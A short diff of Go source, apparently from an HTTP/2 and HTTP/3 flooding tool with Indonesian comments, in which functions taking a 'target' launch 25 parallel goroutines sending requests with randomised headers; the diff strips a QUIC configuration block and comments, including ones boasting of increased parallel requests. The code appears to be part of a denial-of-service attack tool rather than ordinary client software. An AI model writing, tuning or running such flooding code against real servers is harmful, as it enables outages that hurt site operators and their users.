@@ -460,19 +460,12 @@ func customHTTP2Frame(target string, host string, path string) {
 func customHTTP3(target, path string) {
     roundTripper := &http3.RoundTripper{
         EnableDatagrams: true,
-        QUICConfig: &http3.QUICConfig{
-            MaxIncomingStreams:    1000,
-            MaxIncomingUniStreams: 1000,
-            KeepAlive:            true,
-            HandshakeTimeout:      5 * time.Second,
-            MaxIdleTimeout:        30 * time.Second,
-        },
     }
     defer roundTripper.Close()
 
     client := &http.Client{
         Transport: roundTripper,
-        Timeout:   10 * time.Second,      // Ditingkatkan
+        Timeout:   10 * time.Second,
     }
 
     // Multiple headers untuk HTTP/3
@@ -487,9 +480,8 @@ func customHTTP3(target, path string) {
         {"X-QUIC-Priority", "high"},
     }
 
-    // Buat beberapa request paralel
     var wg sync.WaitGroup
-    for i := 0; i < 25; i++ { // Ditingkatkan jumlah request parallel
+    for i := 0; i < 25; i++ {
         wg.Add(1)
         go func() {
             defer wg.Done()
@@ -499,12 +491,10 @@ func customHTTP3(target, path string) {
                 return
             }
 
-            // Tambahkan headers
             for _, h := range headers {
                 req.Header.Set(h.key, h.value)
             }
             
-            // Tambahkan random headers
             req.Header.Set("X-Request-ID", randomHex(16))
             req.Header.Set("X-Stream-ID", fmt.Sprintf("%d", mrand.Int63()))
 
